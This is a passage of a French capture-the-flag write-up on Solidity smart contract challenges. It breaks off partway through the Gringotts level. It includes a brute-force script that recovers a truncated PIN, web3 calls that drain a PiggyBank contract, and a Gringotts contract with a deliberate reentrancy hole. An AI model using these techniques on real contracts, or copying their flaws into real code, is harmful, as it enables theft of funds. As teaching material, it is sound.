+    <span class="kd">function</span> <span class="nx">unlockPiggyBank</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">pin</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">((</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">uint8</span><span class="p">(</span><span class="nx">pin</span><span class="p">)))</span> <span class="o">==</span> <span class="nx">pinHash</span><span class="p">)){</span>
+        <span class="nx">isOwner</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+        <span class="p">}</span>    
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">withdrawPiggyBank</span><span class="p">()</span> <span class="nx">external</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">isOwner</span> <span class="o">==</span> <span class="kc">true</span><span class="p">);</span>
+        <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">funds</span><span class="p">);</span>
+        <span class="nx">isOwner</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="nx">funds</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="analyse-1">Analyse</h2>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">PiggyBank</span> <span class="p">{</span>
+	<span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>On travail maintenant sur le smart contract <code class="highlighter-rouge">PiggyBank</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">bool</span> <span class="kr">public</span> <span class="nx">isOwner</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">funds</span><span class="p">;</span>
+<span class="nx">bytes32</span> <span class="kr">private</span> <span class="nx">pinHash</span> <span class="o">=</span> <span class="mh">0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Ce dernier possède 4 champs:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">isOwner</code>: boolean initialisé à <code class="highlighter-rouge">false</code> qui est publique</li>
+  <li><code class="highlighter-rouge">funds</code>: unsigned int de 256 bits (32 octets) qui est public</li>
+  <li><code class="highlighter-rouge">pinHash</code>: le hash d’un code pin ? qui est privé</li>
+</ul>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+  <span class="nx">funds</span> <span class="o">=</span> <span class="nx">funds</span> <span class="o">+</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Le constructeur qui va initialiser le variable <code class="highlighter-rouge">funds</code> à la quantité d’ether de la première transaction du propriétaire (<code class="highlighter-rouge">msg.value</code>).</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
+  <span class="nx">funds</span> <span class="o">=</span> <span class="nx">funds</span> <span class="o">+</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>La <strong>fallback function</strong> qui met à jour la valeur de <code class="highlighter-rouge">funds</code> en fonction de <code class="highlighter-rouge">msg.value</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">unlockPiggyBank</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">pin</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
+  <span class="k">if</span><span class="p">((</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">uint8</span><span class="p">(</span><span class="nx">pin</span><span class="p">)))</span> <span class="o">==</span> <span class="nx">pinHash</span><span class="p">)){</span>
+    <span class="nx">isOwner</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="p">}</span>    
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Fonction <code class="highlighter-rouge">unlockPiggyBank()</code> qui prend en paramètre un <code class="highlighter-rouge">uint256</code>, appellable seulement depuis l’extérieur (<code class="highlighter-rouge">external</code>). Le champ <code class="highlighter-rouge">pinHash</code> doit être égale au haché de notre input <code class="highlighter-rouge">pin</code>pour rentrer dans le <code class="highlighter-rouge">if</code>. Si c’est le cas, <code class="highlighter-rouge">isOwner</code> passe à <code class="highlighter-rouge">true</code>.</p>
+
+<blockquote>
+  <p><a href="https://ethereum.stackexchange.com/questions/19380/external-vs-public-best-practices">Ressource</a></p>
+
+  <p><code class="highlighter-rouge">public</code>: all can access</p>
+
+  <p><code class="highlighter-rouge">external</code>: cannot be accessed internally, only externally</p>
+
+  <p><code class="highlighter-rouge">internal</code>: only this contract and contracts deriving from it can access</p>
+
+  <p><code class="highlighter-rouge">private</code>: can be accessed only from this contract</p>
+</blockquote>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">withdrawPiggyBank</span><span class="p">()</span> <span class="nx">external</span> <span class="p">{</span>
+  <span class="nx">require</span><span class="p">(</span><span class="nx">isOwner</span> <span class="o">==</span> <span class="kc">true</span><span class="p">);</span>
+	<span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">funds</span><span class="p">);</span>
+  <span class="nx">isOwner</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+  <span class="nx">funds</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Fonction <code class="highlighter-rouge">withdrawPiggyBank()</code>, ne prend pas de paramètre, accessible seulement depuis l’extérieur. Cette fonction transfert les <code class="highlighter-rouge">funds</code>à l’émetteur de la transaction (<code class="highlighter-rouge">msg.sender.transfer(funds);</code>). Pour pouvoir exécuter cette fonction, il faut respecter le <code class="highlighter-rouge">require(isOwner == true)</code>.</p>
+
+<h2 id="attack-1">Attack</h2>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">unlockPiggyBank</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">pin</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
+  <span class="k">if</span><span class="p">((</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">uint8</span><span class="p">(</span><span class="nx">pin</span><span class="p">)))</span> <span class="o">==</span> <span class="nx">pinHash</span><span class="p">)){</span>
+    <span class="nx">isOwner</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="p">}</span>    
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>On comprend rapidement que la fonction à attaquer est <code class="highlighter-rouge">unlockPiggyBank()</code>. Il faut fournir la bonne valeur de <code class="highlighter-rouge">pin</code>qui donne le haché <code class="highlighter-rouge">pinHash</code>(ou <code class="highlighter-rouge">0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c</code>).</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">uint8</span><span class="p">(</span><span class="nx">pin</span><span class="p">)))</span> <span class="o">==</span> <span class="nx">pinHash</span>
+</code></pre></div></div>
+
+<p>En lisant la condition, on peut voir que notre <code class="highlighter-rouge">pin</code> de type <code class="highlighter-rouge">uint256</code> est convertit en <code class="highlighter-rouge">uint8</code> avant d’être haché. On passe alors d’une valeur de 256 bits à une valeur de 8 bits. Il n’y a alors que <code class="highlighter-rouge">2**8 = 256</code> possibilités.</p>
+
+<p>On peut utiliser ce code python pour tester tous les hachés possibles sur 8 bits.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">keccak</span>
+
+<span class="k">for</span> <span class="n">pin</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">keccak</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">digest_bits</span><span class="o">=</span><span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">pin</span><span class="p">]))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">h</span> <span class="o">==</span> <span class="s">'7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'[+] pin -&gt; {pin}'</span><span class="p">)</span>
+        <span class="k">break</span>
+<span class="c1"># [+] pin -&gt; 213
+</span></code></pre></div></div>
+
+<p>La valeur 213 donne bien le bon haché !!</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">abi</span> <span class="o">=</span> <span class="p">[{</span> <span class="s2">"constant"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="p">...</span> <span class="p">}];</span> <span class="c1">// ABI</span>
+<span class="kd">var</span> <span class="nx">contractAddr</span> <span class="o">=</span> <span class="s2">"0x288F068cdae9008944a03a3e7061650046734dC8"</span><span class="p">;</span> <span class="c1">// adresse d'instance</span>
+<span class="kd">var</span> <span class="nx">contract</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">contract</span><span class="p">(</span><span class="nx">abi</span><span class="p">).</span><span class="nx">at</span><span class="p">(</span><span class="nx">contractAddr</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>On créer notre “connexion” au smart contract.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">isOwner</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="kc">false</span>
+
+<span class="nx">contract</span><span class="p">.</span><span class="nx">funds</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">100</span>
+</code></pre></div></div>
+
+<p>La valeur de <code class="highlighter-rouge">isOwner</code> est bien <code class="highlighter-rouge">false</code>, et les fonds disponibles sont de <code class="highlighter-rouge">100</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// avant</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">isOwner</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="kc">false</span>
+
+<span class="c1">// mettre isOwner à true</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">unlockPiggyBank</span><span class="p">(</span><span class="s2">"213"</span><span class="p">,(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+
+<span class="c1">// après</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">isOwner</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="kc">true</span>
+</code></pre></div></div>
+
+<p>On commence par mettre <code class="highlighter-rouge">isOwner</code> à <code class="highlighter-rouge">true</code> en utilisant <code class="highlighter-rouge">unlockPiggyBank()</code> avec <code class="highlighter-rouge">213</code> comme paramètre.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">funds</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">100</span>
+
+<span class="c1">// dépouiller</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">withdrawPiggyBank</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+
+<span class="nx">contract</span><span class="p">.</span><span class="nx">funds</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">0</span>
+</code></pre></div></div>
+
+<p>Et on appelle <code class="highlighter-rouge">withdrawPiggyBank()</code>pour récupérer les fonds. Le smart contract a été dépouillé. On peut alors récupérer notre flag en appuyant sur Check.</p>
+
+<p><code class="highlighter-rouge">SANTA{N0_M0R3_B4D_R4ND0MN3SS_PL3AZ}</code></p>
+
+<h1 id="level-3---gringotts">Level 3 - Gringotts</h1>
+
+<p><strong>Points</strong>: 300</p>
+
+<hr />
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">&gt;=</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">22</span> <span class="o">&lt;</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Gringotts</span> <span class="p">{</span>
+  <span class="nx">mapping</span> <span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">sorceryAllowance</span><span class="p">;</span>
+  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">allowancePerYear</span><span class="p">;</span>
+  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">startStudyDate</span><span class="p">;</span>
+  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">numberOfWithdrawls</span><span class="p">;</span>
+  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">availableAllowance</span><span class="p">;</span>
+  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">alreadyWithdrawn</span><span class="p">;</span>
+    
+    <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nx">allowancePerYear</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="o">/</span><span class="mi">10</span><span class="p">;</span>     
+        <span class="nx">startStudyDate</span> <span class="o">=</span> <span class="nx">now</span><span class="p">;</span>
+        <span class="nx">availableAllowance</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">modifier</span> <span class="nx">isEligible</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">now</span><span class="o">&gt;=</span><span class="nx">startStudyDate</span> <span class="o">+</span> <span class="nx">numberOfWithdrawls</span> <span class="o">*</span> <span class="mi">365</span> <span class="nx">days</span><span class="p">);</span>
+        <span class="nx">alreadyWithdrawn</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="nx">_</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">withdrawAllowance</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">isEligible</span><span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">alreadyWithdrawn</span> <span class="o">==</span> <span class="kc">false</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">availableAllowance</span> <span class="o">&gt;=</span> <span class="nx">allowancePerYear</span><span class="p">){</span>
+         <span class="k">if</span> <span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="nx">allowancePerYear</span><span class="p">)()){</span>
+            <span class="nx">alreadyWithdrawn</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+         <span class="p">}</span>
+        <span class="nx">numberOfWithdrawls</span> <span class="o">=</span> <span class="nx">numberOfWithdrawls</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="nx">sorceryAllowance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="o">-=</span> <span class="nx">allowancePerYear</span><span class="p">;</span>
+        <span class="nx">availableAllowance</span><span class="o">-=</span><span class="nx">allowancePerYear</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">donateToSorcery</span><span class="p">(</span><span class="nx">address</span> <span class="nx">sorceryDestination</span><span class="p">)</span> <span class="nx">payable</span> <span class="kr">public</span><span class="p">{</span>
+    <span class="nx">sorceryAllowance</span><span class="p">[</span><span class="nx">sorceryDestination</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">queryCreditOfSorcery</span><span class="p">(</span><span class="nx">address</span> <span class="nx">sorcerySource</span><span class="p">)</span> <span class="nx">view</span> <span class="kr">public</span> <span class="nx">returns</span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
+    <span class="k">return</span> <span class="nx">sorceryAllowance</span><span class="p">[</span><span class="nx">sorcerySource</span><span class="p">];</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="analyse-2">Analyse</h2>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Gringotts</span> <span class="p">{</span>
+  <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Notre smart contract s’appelle <code class="highlighter-rouge">Gringoots</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">mapping</span> <span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">sorceryAllowance</span><span class="p">;</span>
+<span class="nx">uint</span> <span class="kr">public</span> <span class="nx">allowancePerYear</span><span class="p">;</span>
+<span class="nx">uint</span> <span class="kr">public</span> <span class="nx">startStudyDate</span><span class="p">;</span>
+<span class="nx">uint</span> <span class="kr">public</span> <span class="nx">numberOfWithdrawls</span><span class="p">;</span>
+<span class="nx">uint</span> <span class="kr">public</span> <span class="nx">availableAllowance</span><span class="p">;</span>
+<span class="nx">bool</span> <span class="kr">public</span> <span class="nx">alreadyWithdrawn</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Il possède plusieurs champs, dont un tableau associatif <code class="highlighter-rouge">sorceryAllowance</code>, qui fait correspondre à une <code class="highlighter-rouge">address</code> à un <code class="highlighter-rouge">uint</code>.</p>
+
+<blockquote>
+  <p>Exemple:</p>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sorceryAllowance[0x123] <span class="o">=</span> 0x21
+sorceryAllowance[0x321] <span class="o">=</span> 0x98
+sorceryAllowance[0x213] <span class="o">=</span> 0x23
+</code></pre></div>  </div>
+</blockquote>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+  <span class="nx">allowancePerYear</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="o">/</span><span class="mi">10</span><span class="p">;</span>     
+  <span class="nx">startStudyDate</span> <span class="o">=</span> <span class="nx">now</span><span class="p">;</span>
+  <span class="nx">availableAllowance</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Le constructeur qui initialise différentes variables lors de la création du smart contrat.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">modifier</span> <span class="nx">isEligible</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">require</span><span class="p">(</span><span class="nx">now</span> <span class="o">&gt;=</span> <span class="nx">startStudyDate</span> <span class="o">+</span> <span class="nx">numberOfWithdrawls</span> <span class="o">*</span> <span class="mi">365</span> <span class="nx">days</span><span class="p">);</span>
+  <span class="nx">alreadyWithdrawn</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+  <span class="nx">_</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><code class="highlighter-rouge">now</code> (<code class="highlighter-rouge">uint</code>): current block timestamp (alias for <code class="highlighter-rouge">block.timestamp</code>)</p>
+</blockquote>
+
+<p>On retrouve également ce que l’on appelle un <strong>modifier</strong>. On défini ce code comme des contraintes ou des conditions à respecter lors de l’appel à une fonction.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">require</span><span class="p">(</span><span class="nx">now</span> <span class="o">&gt;=</span> <span class="nx">startStudyDate</span> <span class="o">+</span> <span class="nx">numberOfWithdrawls</span> <span class="o">*</span> <span class="mi">365</span> <span class="nx">days</span><span class="p">);</span>
+<span class="nx">alreadyWithdrawn</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="nx">_</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Dans cet exemple, pour exécuter <code class="highlighter-rouge">alreadyWithdrawn = false;</code>, il faut d’abord que la condition du <code class="highlighter-rouge">require()</code> soit vérifiée.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">withdrawAllowance</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">isEligible</span> <span class="p">{</span>
+  <span class="nx">require</span><span class="p">(</span><span class="nx">alreadyWithdrawn</span> <span class="o">==</span> <span class="kc">false</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">availableAllowance</span> <span class="o">&gt;=</span> <span class="nx">allowancePerYear</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="nx">allowancePerYear</span><span class="p">)()){</span>
+      <span class="nx">alreadyWithdrawn</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">numberOfWithdrawls</span> <span class="o">=</span> <span class="nx">numberOfWithdrawls</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="nx">sorceryAllowance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="o">-=</span> <span class="nx">allowancePerYear</span><span class="p">;</span>
+    <span class="nx">availableAllowance</span><span class="o">-=</span><span class="nx">allowancePerYear</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>La fonction <code class="highlighter-rouge">withdrawAllowance()</code> utilise le modifier <code class="highlighter-rouge">isEligible()</code> précédent. Cette fonction permet de demander une <code class="highlighter-rouge">allowancePerYear</code> au smart contract. On ne peut appeler cette fonction, qu’une seule fois par an car c’est le modifieur qui choisis de mettre à jour <code class="highlighter-rouge">alreadyWithdrawn</code>à <code class="highlighter-rouge">false</code>ou non.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">donateToSorcery</span><span class="p">(</span><span class="nx">address</span> <span class="nx">sorceryDestination</span><span class="p">)</span> <span class="nx">payable</span> <span class="kr">public</span><span class="p">{</span>
+  <span class="nx">sorceryAllowance</span><span class="p">[</span><span class="nx">sorceryDestination</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">queryCreditOfSorcery</span><span class="p">(</span><span class="nx">address</span> <span class="nx">sorcerySource</span><span class="p">)</span> <span class="nx">view</span> <span class="kr">public</span> <span class="nx">returns</span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
+  <span class="k">return</span> <span class="nx">sorceryAllowance</span><span class="p">[</span><span class="nx">sorcerySource</span><span class="p">];</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Ces 2 dernières fonctions permettent de faire un don à une adresse précise et de connaître le solde d’ether d’une adresse précise.</p>
+
+<p>Pour commencer, nous allons utiliser le smart contract d’une manière normale.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">abi</span> <span class="o">=</span> <span class="p">[{</span> <span class="s2">"constant"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="p">...</span> <span class="p">}];</span> <span class="c1">// ABI</span>
+<span class="kd">var</span> <span class="nx">contractAddr</span> <span class="o">=</span> <span class="s2">"0x8B1A677d85cd44afd3878E9201e7eff27e397421"</span><span class="p">;</span> <span class="c1">// adresse d'instance</span>
+<span class="kd">var</span> <span class="nx">contract</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">contract</span><span class="p">(</span><span class="nx">abi</span><span class="p">).</span><span class="nx">at</span><span class="p">(</span><span class="nx">contractAddr</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>On crée notre “connexion” au smart contract.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">allowancePerYear</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">10</span>
+
+<span class="nx">contract</span><span class="p">.</span><span class="nx">startStudyDate</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">1577111586</span> <span class="c1">// Mon Dec 23 2019 15:33:06</span>
+
+<span class="nx">contract</span><span class="p">.</span><span class="nx">numberOfWithdrawls</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">0</span>
+
+<span class="nx">contract</span><span class="p">.</span><span class="nx">availableAllowance</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">100</span>
+
